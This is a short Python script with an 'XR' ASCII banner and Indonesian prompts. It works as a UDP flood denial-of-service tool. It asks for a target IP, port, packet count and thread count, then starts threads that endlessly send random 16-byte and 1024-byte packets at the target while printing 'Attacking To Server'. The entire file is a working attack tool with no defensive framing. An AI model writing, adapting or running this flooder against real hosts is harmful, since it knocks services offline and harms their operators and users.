from ast import Return
import random
import socket
import threading
import time
import os,sys
import random, socket, threading
from timeit import repeat

os.system("clear")
print("""
\033[261m──────────────────────────────────────
\033[261m─████████──████████─████████████████──
\033[261m─██▒▒▒▒██──██▒▒▒▒██─██▒▒▒▒▒▒▒▒▒▒▒▒██──
\033[261m──████▒▒██──██▒▒████─██▒▒████████▒▒██──
\033[261m────██▒▒▒▒██▒▒▒▒██───██▒▒██────██▒▒██──
\033[261m────████▒▒▒▒▒▒████───██▒▒████████▒▒██──
\033[261m──────██▒▒▒▒▒▒██─────██▒▒▒▒▒▒▒▒▒▒▒▒██──
\033[261m────████▒▒▒▒▒▒████───██▒▒██████▒▒████──
\033[261m────██▒▒▒▒██▒▒▒▒██───██▒▒██──██▒▒██────
\033[261m──████▒▒██──██▒▒████─██▒▒██──██▒▒██████
\033[261m──██▒▒▒▒██──██▒▒▒▒██─██▒▒██──██▒▒▒▒▒▒██
\033[261m───███████──████████─██████──██████████
\033[261m──────────────────────────────────────""")
print("\033[31m━━━ Afah Iyah? (y/n)")
choice = str(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ IPnya Tod")
ip = str(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Port")
port = int(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Packets")	
print("\033[31m━━━ Min Pakets 210")
times = int(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Threads")
print("\033[31m━━━ Min Threads 110")
threads = int(input("┗━>\033[0m:"))
def xxxx():
  data = random._urandom(16)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] XR ATTACK SERVER")

def xxx():
  data = random._urandom(1024)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
        print(i +" \033[91m}=====> Attacking To Server \033[0m%s:%s!!!"%(ip,port))
    except:
      print("[!] XR ATTACK SERVER")

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = xxxx)
    th.start()
    th = threading.Thread(target = xxx)
    th.start()

  Return 
  repeat
